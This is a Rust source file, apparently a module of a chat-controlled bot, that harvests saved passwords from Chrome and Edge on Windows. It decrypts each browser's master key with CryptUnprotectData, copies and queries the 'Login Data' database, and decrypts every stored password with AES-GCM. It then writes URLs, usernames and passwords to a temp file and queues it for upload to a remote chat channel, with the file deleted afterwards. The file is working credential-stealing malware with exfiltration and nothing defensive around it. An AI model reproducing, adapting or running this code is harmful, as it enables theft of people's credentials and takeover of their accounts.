use std::{fs::{File, self}, io::{BufReader, Read, BufWriter, Write}, slice, ffi::OsString, collections::HashMap, path::Path};
use aes_gcm::{aead::{generic_array::GenericArray, Aead}, Aes256Gcm, KeyInit};
use bstr::BString;
use rand::distributions::{Alphanumeric, DistString};
use serde_json::{Value, json};
use sqlite::State;
use windows::Win32::Security::Cryptography::{CRYPT_INTEGER_BLOB, CryptUnprotectData};
use crate::BOT_TO_SEND;
#[derive(PartialEq, Clone, Copy)]
enum Browsers {
    Chrome= 0, Edge= 1
}
fn get_encryption_key(browser: Browsers) -> Vec<u8> {
    if let Ok(f)= File::open(std::env::var_os("localappdata").unwrap_or(OsString::new()).to_string_lossy().to_string() + if browser== Browsers::Chrome {
        "\\Google\\Chrome\\User Data\\Local State"
    }else{
        "\\Microsoft\\Edge\\User Data\\Local State"
    }) {
        let mut f= BufReader::new(f);
        let mut bufs= String::new();
        let _= f.read_to_string(&mut bufs);
        if !bufs.contains("os_crypt") {
            return Vec::new();
        }
        if let Ok(json)= serde_json::from_str::<Value>(&bufs) {
            if let Ok(mut master_key)= rbase64::decode(json["os_crypt"]["encrypted_key"].as_str().unwrap_or("")) {
                master_key= master_key[5..].to_vec();
                let mut output= CRYPT_INTEGER_BLOB {
                    cbData: 0,
                    pbData: std::ptr::null_mut()
                };
                unsafe {
                    CryptUnprotectData(&CRYPT_INTEGER_BLOB {
                        cbData: master_key.len() as u32,
                        pbData: master_key.as_mut_ptr()
                    }, None, None, None, None, 0, &mut output);
                    drop(master_key);
                    let v= slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
                    return v;
                }
            }
        }
    }
    Vec::new()
}
fn decrypt_password(browser: Browsers, password: &[u8], key: &mut [u8]) -> String {
    let gkey= GenericArray::from_slice(key);
    let cipher= Aes256Gcm::new(gkey);
    let nonce= GenericArray::from_slice(&password[3..15]);
    match cipher.decrypt(nonce, &password[15..]) {
        Ok(v) => {
            BString::new(v).to_string()
        }
        Err(_) => {
            if browser== Browsers::Edge {
                return "Chrome < 80".to_string();
            }
            let mut output= CRYPT_INTEGER_BLOB {
                cbData: 0,
                pbData: std::ptr::null_mut()
            };
            unsafe {
                CryptUnprotectData(&CRYPT_INTEGER_BLOB {
                    cbData: key.len() as u32,
                    pbData: key.as_mut_ptr()
                }, None, None, None, None, 0, &mut output);
                let v= slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
                BString::new(v).to_string()
            }
        }
    }
}
fn get_password(browser: Browsers) -> HashMap<String, (String, String)> {
    let mut rng= rand::thread_rng();
    let mut entries= HashMap::new();
    let mut key= get_encryption_key(browser);
    let str_path= std::env::var_os("localappdata").unwrap_or(OsString::new()).to_string_lossy().to_string() + if browser== Browsers::Chrome {
        "\\Google\\Chrome\\User Data\\Default\\Login Data"
    }else{
        "\\Microsoft\\Edge\\User Data\\Default\\Login Data"
    };
    let path= Path::new(&str_path);
    if path.exists() {
        let newpath= std::env::temp_dir().to_string_lossy().to_string() + "\\database-" + &Alphanumeric.sample_string(&mut rng, 5) + ".db";
        let _= fs::copy(path, &newpath);
        let path= newpath;
        let db= sqlite::Connection::open(&path).unwrap();
        let mut statement= db.prepare(if browser== Browsers::Chrome {
            "SELECT origin_url, username_value, password_value FROM logins"
        }else{
            "SELECT action_url, username_value, password_value FROM logins"
        }).unwrap();
        while let Ok(State::Row)= statement.next() {
            let url= statement.read::<String, _>(0).unwrap();
            let username= statement.read::<String, _>(1).unwrap();
            let password= decrypt_password(browser, &statement.read::<Vec<u8>, _>(2).unwrap(), &mut key);
            if !username.is_empty() && !password.is_empty() {
                entries.insert(url, (username, password));
            }
        }
        drop(statement);
        let _= fs::remove_file(&path);
    }
    entries
}
pub fn grab_all() -> HashMap<String, (String, String)> {
    let mut map= get_password(Browsers::Chrome);
    map.extend(get_password(Browsers::Edge));
    map
}
pub async fn main(channel_id: u64) {
    let output= grab_all();
    if !output.is_empty() {
        let path= std::env::temp_dir().to_string_lossy().to_string() + &Alphanumeric.sample_string(&mut rand::thread_rng(), 12) + ".txt";
        let mut f= BufWriter::new(File::create(&path).unwrap());
        let mut s= String::new();
        for (url, (username, password)) in output {
            s+= &("Url: ".to_owned() + &url + "\nUsername: " + &username + "\nPassword: " + &password + "\n\n");
        }
        f.write_all(s.as_bytes()).unwrap();
        f.flush().unwrap();
        drop(f);
        BOT_TO_SEND.lock().await.push(json!({
            "channel": channel_id,
            "content": "Passwords found:",
            "files": [path],
            "delete_files": true,
            "react": ["📌"]
        }));
    }
}